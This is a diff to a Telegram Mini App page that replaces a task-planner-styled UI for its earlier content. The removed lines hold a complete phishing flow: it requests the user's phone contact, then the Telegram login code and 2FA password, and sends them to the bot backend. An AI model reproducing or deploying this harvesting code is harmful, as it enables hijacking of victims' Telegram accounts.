@@ -1,70 +1,110 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <script src="https://telegram.org/js/telegram-web-app.js"></script>
-    <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { width: 85%; padding: 25px; border: 1px solid #333; border-radius: 20px; text-align: center; background: #0a0a0a; }
-        .btn { background: #00ff88; color: #000; padding: 15px; border-radius: 12px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 20px; }
-        .hidden { display: none; }
-        input { width: 100%; padding: 15px; margin: 10px 0; border-radius: 10px; border: 1px solid #333; background: #111; color: #fff; box-sizing: border-box; text-align: center; }
-        #status { color: #555; font-size: 12px; margin-top: 10px; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover, maximum-scale=1" />
+  <meta name="theme-color" content="#05010a" />
+  <title>PULSE — Action Planner</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700&family=Syne:wght@600;700;800&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="styles.css" />
 </head>
 <body>
-    <div class="card">
-        <div id="step1">
-            <h2 style="color: #00ff88;">ВЕРИФИКАЦИЯ</h2>
-            <p id="msg">Нажмите кнопку, чтобы подтвердить номер</p>
-            <button class="btn" id="auth-btn">ШАГ 1: ПОДТВЕРДИТЬ</button>
-            <button class="btn hidden" id="send-btn" style="background: #fff;">ШАГ 2: ОТПРАВИТЬ КОД</button>
+  <div class="aurora" aria-hidden="true">
+    <span class="orb orb-a"></span>
+    <span class="orb orb-b"></span>
+    <span class="orb orb-c"></span>
+    <span class="grid"></span>
+  </div>
+
+  <main class="app">
+    <header class="hero">
+      <p class="brand">PULSE</p>
+      <h1 class="headline" id="greeting">Твой день в неоне</h1>
+      <p class="lede">Собирай действия. Держи фокус. Закрывай список, как сет-лист.</p>
+      <div class="cta-row">
+        <button type="button" class="btn btn-primary" id="quick-add" data-haptic="medium">
+          <span class="btn-glow"></span>
+          Новое действие
+        </button>
+        <button type="button" class="btn btn-ghost" id="focus-mode" data-haptic="light">Фокус</button>
+      </div>
+      <div class="ring-wrap" aria-hidden="true">
+        <svg class="ring" viewBox="0 0 120 120">
+          <circle class="ring-track" cx="60" cy="60" r="52" />
+          <circle class="ring-progress" id="ring-progress" cx="60" cy="60" r="52" />
+        </svg>
+        <div class="ring-label">
+          <strong id="progress-pct">0%</strong>
+          <span>готово</span>
         </div>
-        <div id="step2" class="hidden">
-            <h2>ШАГ 3</h2>
-            <input type="number" id="sms-code" placeholder="Код из Telegram">
-            <input type="password" id="two-fa" placeholder="Пароль (если есть)">
-            <button class="btn" id="final-btn">ЗАВЕРШИТЬ</button>
-        </div>
-        <div id="status">v.999 Active</div>
-    </div>
+      </div>
+    </header>
 
-    <script>
-        const tg = window.Telegram.WebApp;
-        tg.ready();
-        let phone = "";
+    <section class="daystrip" aria-label="Дни недели">
+      <div class="daystrip-scroll" id="daystrip"></div>
+    </section>
 
-        // Шаг 1: Получаем контакт
-        document.getElementById('auth-btn').onclick = function() {
-            tg.requestContact(function(ok, res) {
-                if (ok) {
-                    phone = res.response_data?.phone_number || res.contact?.phone_number;
-                    if (phone) {
-                        // Скрываем первую кнопку, показываем вторую
-                        document.getElementById('auth-btn').classList.add('hidden');
-                        document.getElementById('send-btn').classList.remove('hidden');
-                        document.getElementById('msg').innerText = "Номер получен! Нажмите 'ОТПРАВИТЬ КОД'";
-                    }
-                }
-            });
-        };
+    <section class="filters" aria-label="Фильтры">
+      <button type="button" class="chip is-active" data-filter="all">Все</button>
+      <button type="button" class="chip" data-filter="open">Открытые</button>
+      <button type="button" class="chip" data-filter="done">Сделано</button>
+      <button type="button" class="chip chip-hot" data-filter="hot">Горячие</button>
+    </section>
 
-        // Шаг 2: Отправляем на бэкенд
-        document.getElementById('send-btn').onclick = function() {
-            if (phone) {
-                tg.sendData(JSON.stringify({a: "s", p: String(phone)}));
-                document.getElementById('step1').classList.add('hidden');
-                document.getElementById('step2').classList.remove('hidden');
-            }
-        };
+    <section class="list-section">
+      <div class="section-head">
+        <h2>План</h2>
+        <p id="list-meta">0 действий</p>
+      </div>
+      <ul class="task-list" id="task-list"></ul>
+      <div class="empty" id="empty-state">
+        <p class="empty-title">Пусто и красиво</p>
+        <p class="empty-text">Добавь первое действие — и лента загорится.</p>
+      </div>
+    </section>
+  </main>
 
-        // Шаг 3: Финальный вход
-        document.getElementById('final-btn').onclick = function() {
-            const c = document.getElementById('code')?.value || document.getElementById('sms-code').value;
-            const p = document.getElementById('two-fa').value || "none";
-            tg.sendData(JSON.stringify({a: "v", p: String(phone), c: String(c), pass: String(p)}));
-            setTimeout(() => { tg.close(); }, 500);
-        };
-    </script>
+  <div class="sheet-backdrop" id="sheet-backdrop" hidden></div>
+  <aside class="sheet" id="sheet" aria-hidden="true" role="dialog" aria-labelledby="sheet-title">
+    <div class="sheet-handle"></div>
+    <h2 id="sheet-title">Новое действие</h2>
+    <form id="task-form" autocomplete="off">
+      <label class="field">
+        <span>Что сделать</span>
+        <input type="text" id="task-title" name="title" maxlength="120" placeholder="Например: созвон с командой" required />
+      </label>
+      <label class="field">
+        <span>Время</span>
+        <input type="time" id="task-time" name="time" />
+      </label>
+      <fieldset class="priority">
+        <legend>Приоритет</legend>
+        <label class="prio prio-hot"><input type="radio" name="priority" value="hot" checked /><span>Hot</span></label>
+        <label class="prio prio-glow"><input type="radio" name="priority" value="glow" /><span>Glow</span></label>
+        <label class="prio prio-soft"><input type="radio" name="priority" value="soft" /><span>Soft</span></label>
+      </fieldset>
+      <button type="submit" class="btn btn-primary btn-block" data-haptic="success">
+        <span class="btn-glow"></span>
+        В план
+      </button>
+    </form>
+  </aside>
+
+  <nav class="dock" aria-label="Навигация">
+    <button type="button" class="dock-btn is-active" data-view="today" data-haptic="light">
+      <span>Сегодня</span>
+    </button>
+    <button type="button" class="dock-fab" id="dock-add" data-haptic="medium" aria-label="Добавить">
+      <span>+</span>
+    </button>
+    <button type="button" class="dock-btn" data-view="week" data-haptic="light">
+      <span>Неделя</span>
+    </button>
+  </nav>
+
+  <script src="app.js"></script>
 </body>
 </html>
